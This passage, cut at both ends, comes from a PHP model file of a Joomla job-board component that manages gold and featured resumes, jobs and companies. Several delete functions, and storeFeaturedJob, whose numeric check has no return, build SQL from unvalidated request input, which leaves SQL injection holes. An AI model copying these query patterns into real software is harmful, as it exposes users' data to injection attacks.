            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }

        if ($searchjobseekerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchjobseekerpackage . '%', false);

        $query .= " ORDER BY app.create_date DESC";

        $db->setQuery($query, $limitstart, $limit);
        $goldresumes = $db->loadObjectList();

        $lists = array();

        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchjobseekerpackage)
            $lists['searchjobseekerpackage'] = $searchjobseekerpackage;


        $result[0] = $goldresumes;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getGoldResumeById($resumeid, $c_id) {
        $db = & JFactory :: getDBO();
        if (is_numeric($resumeid) == false)
            return false;
        if (is_numeric($c_id) == false)
            return false;
        $result = array();

        $query = "SELECT goldresume.id,goldresume.application_title ,goldresume.packageid 
		FROM #__js_job_resume AS goldresume";
        $id = ($resumeid != '' AND $resumeid != 0) ? $resumeid : $c_id;
        $query.=" WHERE goldresume.id=" . $id;

        $db->setQuery($query);
        $goldresume = $db->loadObject();

        if (isset($goldresume)) {
            $lists['jobseekerpackage'] = JHTML::_('select.genericList', $this->getJobSeekerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', $goldresume->packageid);
        } else {
            $lists['jobseekerpackage'] = JHTML::_('select.genericList', $this->getJobSeekerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', '');
        }

        $query = "SELECT resume.application_title
		FROM #__js_job_resume AS resume 
		WHERE resume.id=" . $resumeid;

        $db->setQuery($query);
        $application_title = $db->loadResult();

        $result[0] = $goldresume;
        $result[1] = $lists;
        $result[2] = $application_title;
        return $result;
    }

    function storeGoldResume($uid, $resumeid) {
        $db = & JFactory :: getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($resumeid) == false)
            return false;

        $data = JRequest :: get('post');
        $result = $this->GoldResumeValidation($uid, $resumeid);
        if ($result == false) {
            return 6;
        } else {
            $query = "UPDATE `#__js_job_resume` SET isgoldresume = 1 WHERE id = " . $resumeid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
            else
                return true;
        }
    }

    function GoldResumeValidation($uid, $resumeid) {


        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;

        $query = "SELECT COUNT(resume.id)  
		FROM #__js_job_resume  AS resume
		WHERE resume.isgoldresume=1 AND resume.id = " . $resumeid;
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return true;
        else
            return false;
    }

    function deleteGoldResume() {
        $db = & JFactory :: getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $deleteall = 1;
        foreach ($cids as $cid) {
            $query = "UPDATE `#__js_job_resume` SET isgoldresume = 0 WHERE id = " . $cid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
        }
        return true;
    }

    function &getFeaturedResumes($searchtitle, $searchname, $searchemployerpackage, $limitstart, $limit) {

        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(featuredresumes.id) 
		FROM #__js_job_resume AS featuredresumes
		LEFT JOIN #__js_job_jobseekerpackages AS package ON package.id=featuredresumes.packageid
		WHERE featuredresumes.isfeaturedresume=1 AND featuredresumes.status <> 0";
        if ($searchtitle)
            $query .= " AND LOWER(featuredresumes.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(featuredresumes.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(featuredresumes.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(featuredresumes.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT featuredresumes.id,featuredresumes.status,featuredresumes.application_title,featuredresumes.first_name, featuredresumes.last_name 
				, featuredresumes.create_date,package.title AS packagetitle
				FROM #__js_job_resume AS featuredresumes 
				LEFT JOIN #__js_job_jobseekerpackages AS package ON package.id=featuredresumes.packageid
				WHERE featuredresumes.isfeaturedresume=1 AND featuredresumes.status <> 0";
		
		
		if ($searchtitle) $query .= " AND LOWER(featuredresumes.application_title) LIKE ".$db->Quote( '%'.$searchtitle.'%', false );
		if ($searchname) {
			$query .= " AND (";
				$query .= " LOWER(featuredresumes.first_name) LIKE ".$db->Quote( '%'.$searchname.'%', false );
				$query .= " OR LOWER(featuredresumes.last_name) LIKE ".$db->Quote( '%'.$searchname.'%', false );
				$query .= " OR LOWER(featuredresumes.middle_name) LIKE ".$db->Quote( '%'.$searchname.'%', false );
			$query .= " )";
		}	
		if ($searchemployerpackage) $query .= " AND LOWER(package.title) LIKE ".$db->Quote( '%'.$searchemployerpackage.'%', false );


        $query .= " ORDER BY featuredresumes.create_date DESC";

        $db->setQuery($query, $limitstart, $limit);
        $featuredresumes = $db->loadObjectList();

        $lists = array();

        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchemployerpackage)
            $lists['searchemployerpackage'] = $searchemployerpackage;



        $result[0] = $featuredresumes;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllUnapprovedFeaturedResume($searchtitle, $searchname, $searchjobseekerpackage, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(featuredresumes.id) 
		FROM #__js_job_featuredresumes AS featuredresumes
		JOIN #__js_job_jobseekerpackages AS package ON package.id=featuredresumes.packageid
		WHERE featuredresumes.status = 0";
        if ($searchtitle)
            $query .= " AND LOWER(app.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobseekerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchjobseekerpackage . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT featuredresumes.*,app.application_title,app.first_name, app.last_name 
				, app.create_date,package.title AS packagetitle
				FROM #__js_job_featuredresumes AS featuredresumes ,#__js_job_resume AS app,#__js_job_jobseekerpackages AS package
				WHERE app.id=featuredresumes.resumeid AND  package.id=featuredresumes.packageid AND featuredresumes.status = 0";


        if ($searchtitle)
            $query .= " AND LOWER(app.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobseekerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchjobseekerpackage . '%', false);


        $query .= " ORDER BY app.create_date DESC";
        $db->setQuery($query, $limitstart, $limit);
        $featuredresumes = $db->loadObjectList();
        $lists = array();

        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;

        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchjobseekerpackage)
            $lists['searchjobseekerpackage'] = $searchjobseekerpackage;

        $result[0] = $featuredresumes;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getFeaturedResumeById($resumeid, $c_id) {
        if (is_numeric($resumeid) == false)
            return false;
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();

        $query = "SELECT featuredresume.id,featuredresume.application_title ,featuredresume.packageid 
		FROM #__js_job_resume AS featuredresume";
        $id = ($resumeid != '' AND $resumeid != 0) ? $resumeid : $c_id;
        $query.=" WHERE featuredresume.id=" . $id;

        $db->setQuery($query);
        $featuredresume = $db->loadObject();
        if (isset($featuredresume)) {
            $lists['jobseekerpackage'] = JHTML::_('select.genericList', $this->getJobSeekerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', $featuredresume->packageid);
        } else {
            $lists['jobseekerpackage'] = JHTML::_('select.genericList', $this->getJobSeekerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', '');
        }

        $query = "SELECT resume.application_title
		FROM #__js_job_resume AS resume 
		WHERE resume.id=" . $resumeid;

        $db->setQuery($query);
        $application_title = $db->loadResult();


        $result[0] = $featuredresume;
        $result[1] = $lists;
        $result[2] = $application_title;
        return $result;
    }

    function storeFeaturedResume($uid, $resumeid) {
        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($resumeid) == false)
            return false;

        $data = JRequest :: get('post');
        $result = $this->featuredResumeValidation($uid, $resumeid);
        if ($result == false) {
            return 6;
        } else {
            $query = "UPDATE `#__js_job_resume` SET isfeaturedresume = 1 WHERE id = " . $resumeid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
            else
                return true;
        }
    }

    function featuredResumeValidation($uid, $resumeid) {
        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if ((is_numeric($resumeid) == false) || ($resumeid == 0) || ($resumeid == ''))
            return false;

        $query = "SELECT COUNT(resume.id)  
		FROM #__js_job_resume  AS resume
		WHERE resume.isfeaturedresume=1 AND resume.id = " . $resumeid;
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return true;
        else
            return false;
    }

    function deleteFeaturedResume() {
        $db = & JFactory :: getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $deleteall = 1;
        foreach ($cids as $cid) {
            $query = "UPDATE `#__js_job_resume` SET isfeaturedresume = 0 WHERE id = " . $cid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
        }
        return true;
    }

    function & getGoldJobs($searchtitle, $searchcompany, $searchemployerpackage, $limitstart, $limit) {

        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(goldjobs.id)
		FROM #__js_job_jobs AS goldjobs
		LEFT JOIN #__js_job_employerpackages AS package ON package.id=goldjobs.packageid
		LEFT JOIN #__js_job_companies AS company ON  company.id=goldjobs.companyid
		WHERE goldjobs.isgoldjob=1 AND goldjobs.status <> 0";

        if ($searchtitle)
            $query .= " AND LOWER(goldjobs.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT goldjobs.*,company.name AS companyname,package.title AS packagetitle,package.status AS packagestatus,
		package.created AS packagecreated
		FROM #__js_job_jobs AS goldjobs
		LEFT JOIN #__js_job_employerpackages AS package ON package.id=goldjobs.packageid
		LEFT JOIN #__js_job_companies AS company ON  company.id=goldjobs.companyid
		WHERE goldjobs.isgoldjob=1 AND goldjobs.status <> 0";

        if ($searchtitle)
            $query .= " AND LOWER(goldjobs.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);

        $query .= " ORDER BY goldjobs.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $goldjobs = $db->loadObjectList();

        $lists = array();

        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchemployerpackage)
            $lists['searchemployerpackage'] = $searchemployerpackage;


        $result[0] = $goldjobs;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllUnapprovedGoldJobs($searchtitle, $searchcompany, $searchemployerpackage, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(goldjobs.id)
		FROM #__js_job_goldjobs AS goldjobs
		JOIN   #__js_job_jobs AS jobs  ON  jobs.id=goldjobs.jobid
		LEFT JOIN #__js_job_employerpackages AS package ON package.id=goldjobs.packageid
		LEFT JOIN #__js_job_companies AS company ON  company.id=jobs.companyid
		WHERE goldjobs.status = 0";

        if ($searchtitle)
            $query .= " AND LOWER(jobs.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT goldjobs.*,jobs.title,company.name AS companyname,package.title AS packagetitle,package.status AS packagestatus,
		package.created AS packagecreated
		FROM #__js_job_goldjobs AS goldjobs
		JOIN   #__js_job_jobs AS jobs  ON  jobs.id=goldjobs.jobid
		LEFT JOIN #__js_job_employerpackages AS package ON package.id=goldjobs.packageid
		LEFT JOIN #__js_job_companies AS company ON  company.id=jobs.companyid
		WHERE goldjobs.status = 0";

        if ($searchtitle)
            $query .= " AND LOWER(jobs.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);

        $query .= " ORDER BY jobs.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $goldjobs = $db->loadObjectList();
        $lists = array();

        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchemployerpackage)
            $lists['searchemployerpackage'] = $searchemployerpackage;

        $result[0] = $goldjobs;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getGoldJobId($jobid, $c_id) {
        if (is_numeric($jobid) == false)
            return false;
        if (is_numeric($c_id) == false)
            return false;

        $db = & JFactory :: getDBO();
        $result = array();

        $query = "SELECT goldjob.id,goldjob.title AS jobtitle,goldjob.packageid 
		FROM #__js_job_jobs AS goldjob";
        $id = ($jobid != '' AND $jobid != 0) ? $jobid : $c_id;
        $query.=" WHERE goldjob.id=" . $id;

        $db->setQuery($query);
        $goldjob = $db->loadObject();

        if (isset($goldjob)) {
            $lists['employerpackage'] = JHTML::_('select.genericList', $this->getEmployerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', $goldjob->packageid);
        } else {
            $lists['employerpackage'] = JHTML::_('select.genericList', $this->getEmployerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', '');
        }

        $query = "SELECT job.title AS jobtitle
		 FROM #__js_job_jobs AS job
		 WHERE job.id=" . $jobid;

        $db->setQuery($query);
        $jobtitle = $db->loadResult();

        $result[0] = $goldjob;
        $result[1] = $lists;
        $result[2] = $jobtitle;
        return $result;
    }

    function storeGoldJob($jobid, $uid) {
        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($jobid) == false)
            return false;
        $data = JRequest :: get('post');
        $result = $this->goldJobValidation($uid, $jobid);
        if ($result == false) {
            return 6;
        } else {
            $query = "UPDATE `#__js_job_jobs` SET isgoldjob = 1 WHERE id = " . $jobid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
            else
                return true;
        }
    }

    function goldJobValidation($uid, $jobid) {
        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;

        $query = "SELECT COUNT(job.id)  
		FROM #__js_job_jobs  AS job
		WHERE job.isgoldjob=1 AND job.id = " . $jobid;
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return true;
        else
            return false;
    }

    function deleteGoldJob() {
        $db = & JFactory :: getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $deleteall = 1;
        foreach ($cids as $cid) {
            $query = "UPDATE `#__js_job_jobs` SET isgoldjob = 0 WHERE id = " . $cid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
        }
        return true;
    }

    function & getFeaturedJobs($searchtitle, $searchcompany, $searchemployerpackage, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(featuredjobs.id)
		FROM #__js_job_jobs AS featuredjobs
		LEFT JOIN #__js_job_employerpackages AS package ON package.id=featuredjobs.packageid
		LEFT JOIN #__js_job_companies AS company ON  company.id=featuredjobs.companyid
		WHERE featuredjobs.isfeaturedjob=1 AND featuredjobs.status <> 0";

        if ($searchtitle)
            $query .= " AND LOWER(featuredjobs.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT featuredjobs.*,featuredjobs.title,company.name AS companyname,package.title AS packagetitle,package.status AS packagestatus,
		package.created AS packagecreated
		FROM #__js_job_jobs AS featuredjobs
		LEFT JOIN #__js_job_employerpackages AS package ON package.id=featuredjobs.packageid
		LEFT JOIN #__js_job_companies AS company ON  company.id=featuredjobs.companyid
		WHERE featuredjobs.isfeaturedjob=1 AND featuredjobs.status <> 0";

        if ($searchtitle)
            $query .= " AND LOWER(featuredjobs.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);

        $query .= " ORDER BY featuredjobs.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $featuredjobs = $db->loadObjectList();
        $lists = array();

        $job_type = $this->getJobType(JText::_('JS_SELECT_JOB_TYPE'));
        $jobstatus = $this->getJobStatus(JText::_('JS_SELECT_JOB_STATUS'));

        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchemployerpackage)
            $lists['searchemployerpackage'] = $searchemployerpackage;

        $db->setQuery($query, $limitstart, $limit);
        $featuredjobs = $db->loadObjectList();

        $result[0] = $featuredjobs;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllUnapprovedFeaturedJobs($searchtitle, $searchcompany, $searchemployerpackage, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(featuredjobs.id)
		FROM #__js_job_featuredjobs AS featuredjobs
		JOIN   #__js_job_jobs AS jobs  ON  jobs.id=featuredjobs.jobid
		LEFT JOIN #__js_job_employerpackages AS package ON package.id=featuredjobs.packageid
		LEFT JOIN #__js_job_companies AS company ON  company.id=jobs.companyid
		WHERE featuredjobs.status = 0";

        if ($searchtitle)
            $query .= " AND LOWER(jobs.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);


        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT featuredjobs.*,jobs.title,company.name AS companyname,package.title AS packagetitle,package.status AS packagestatus,
		package.created AS packagecreated
		FROM #__js_job_featuredjobs AS featuredjobs
		JOIN   #__js_job_jobs AS jobs  ON  jobs.id=featuredjobs.jobid
		LEFT JOIN #__js_job_employerpackages AS package ON package.id=featuredjobs.packageid
		LEFT JOIN #__js_job_companies AS company ON  company.id=jobs.companyid
		WHERE featuredjobs.status = 0";

        if ($searchtitle)
            $query .= " AND LOWER(jobs.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);

        $query .= " ORDER BY jobs.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $featuredjobs = $db->loadObjectList();
        $lists = array();

        $job_type = $this->getJobType(JText::_('JS_SELECT_JOB_TYPE'));
        $jobstatus = $this->getJobStatus(JText::_('JS_SELECT_JOB_STATUS'));

        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchemployerpackage)
            $lists['searchemployerpackage'] = $searchemployerpackage;


        $result[0] = $featuredjobs;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getFeaturedJobId($jobid, $c_id) {
        if (is_numeric($jobid) == false)
            return false;
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();

        $query = "SELECT featuredjob.id,featuredjob.title AS jobtitle,featuredjob.packageid 
		FROM #__js_job_jobs AS featuredjob";
        $id = ($jobid != '' AND $jobid != 0) ? $jobid : $c_id;
        $query.=" WHERE featuredjob.id=" . $id;

        $db->setQuery($query);
        $featuredjob = $db->loadObject();

        if (isset($featuredjob)) {
            $lists['employerpackage'] = JHTML::_('select.genericList', $this->getEmployerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', $featuredjob->packageid);
        } else {
            $lists['employerpackage'] = JHTML::_('select.genericList', $this->getEmployerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', '');
        }
        $query = "SELECT job.title AS jobtitle
		 FROM #__js_job_jobs AS job
		 WHERE job.id=" . $jobid;

        $db->setQuery($query);
        $jobtitle = $db->loadResult();

        $result[0] = $featuredjob;
        $result[1] = $lists;
        $result[2] = $jobtitle;
        return $result;
    }

    function storeFeaturedJob($uid, $jobid) {
        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($jobid) == false)
        $data = JRequest :: get('post');
        $result = $this->featuredJobValidation($uid, $jobid);
        if ($result == false) {
            return 6;
        } else {
            $query = "UPDATE `#__js_job_jobs` SET isfeaturedjob = 1 WHERE id = " . $jobid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
            else
                return true;
        }
    }

    function featuredJobValidation($uid, $jobid) {

        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;

        $query = "SELECT COUNT(job.id)  
		FROM #__js_job_jobs  AS job
		WHERE job.isfeaturedjob=1 AND job.id = " . $jobid;
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return true;
        else
            return false;
    }

    function deleteFeaturedJob() {
        $db = & JFactory :: getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $deleteall = 1;
        foreach ($cids as $cid) {
            $query = "UPDATE `#__js_job_jobs` SET isfeaturedjob = 0 WHERE id = " . $cid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
        }
        return true;
    }

    function & getGoldCompanies($searchcompany, $searchemployerpackage, $searchcountry, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(goldcompany.id)
		FROM  #__js_job_companies AS goldcompany
		LEFT JOIN  #__js_job_employerpackages AS package  ON  package.id=goldcompany.packageid
		WHERE goldcompany.isgoldcompany=1 AND  goldcompany.status <>0";
        if ($searchcompany)
            $query .= " AND LOWER(goldcompany.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT goldcompany.id,goldcompany.name,goldcompany.created,goldcompany.status,package.title AS packagetitle
		FROM  #__js_job_companies AS goldcompany
		LEFT JOIN   #__js_job_employerpackages AS package  ON  package.id=goldcompany.packageid
		WHERE goldcompany.isgoldcompany=1 AND goldcompany.status <> 0";
        if ($searchcompany)
            $query .= " AND LOWER(goldcompany.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);

        $db->setQuery($query, $limitstart, $limit);
        $goldcompany = $db->loadObjectList();

        $lists = array();

        $countries = $this->getCountries(JText::_('JS_SELECT_COUNTRY'));
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;

        if ($searchemployerpackage)
            $lists['searchemployerpackage'] = $searchemployerpackage;

        $result[0] = $goldcompany;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }
    function checkCall() {
        $db = JFactory::getDBO();
        $query = "UPDATE `#__js_job_config` SET configvalue = configvalue+1 WHERE configname = " . $db->quote('jsjobupdatecount');
        $db->setQuery($query);
        $db->query();
        $query = "SELECT configvalue AS jsjobupdatecount FROM `#__js_job_config` WHERE configname = " . $db->quote('jsjobupdatecount');
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result >= 100)
            $this->concurrentrequestdata();
    }

    function & getAllUnapprovedGoldCompanies($searchcompany, $searchemployerpackage, $searchcountry, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(goldcompany.id)
		FROM #__js_job_goldcompanies AS goldcompany
		JOIN  #__js_job_employerpackages AS package  ON  package.id=goldcompany.packageid
		JOIN  #__js_job_companies AS company  ON  company.id=goldcompany.companyid
		WHERE goldcompany.status = 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT goldcompany.*,company.name,country.name AS countryname,package.title AS packagetitle
		FROM #__js_job_goldcompanies AS goldcompany
		JOIN   #__js_job_companies AS company  ON  company.id=goldcompany.companyid
		JOIN   #__js_job_employerpackages AS package  ON  package.id=goldcompany.packageid
		JOIN #__js_job_countries AS country ON company.country = country.id
		WHERE goldcompany.status = 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);

        $db->setQuery($query, $limitstart, $limit);
        $goldcompany = $db->loadObjectList();

        $lists = array();

        $countries = $this->getCountries(JText::_('JS_SELECT_COUNTRY'));
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;

        if ($searchemployerpackage)
            $lists['searchemployerpackage'] = $searchemployerpackage;

        if ($searchcountry)
            $lists['country'] = JHTML::_('select.genericList', $countries, 'searchcountry', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchcountry);
        else
            $lists['country'] = JHTML::_('select.genericList', $countries, 'searchcountry', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $goldcompany;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getGoldCompanyId($companyid, $c_id) {
        if (is_numeric($companyid) == false)
            return false;
        if (is_numeric($c_id) == false)
            return false;

        $db = & JFactory :: getDBO();
        $result = array();

        $query = "SELECT goldcompany.id,goldcompany.name AS companyname,goldcompany.packageid
		FROM #__js_job_companies AS goldcompany";
        $id = ($companyid != '' AND $companyid != 0) ? $companyid : $c_id;
        $query.=" WHERE goldcompany.id=" . $id;

        $db->setQuery($query);
        $goldcompany = $db->loadObject();

        if (isset($goldcompany)) {
            $lists['companies'] = JHTML::_('select.genericList', $this->getCompany(''), 'companyid', 'class="inputbox required" ' . '', 'value', 'text', $goldcompany->id);
            $lists['employerpackage'] = JHTML::_('select.genericList', $this->getEmployerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', $goldcompany->packageid);
        } else {
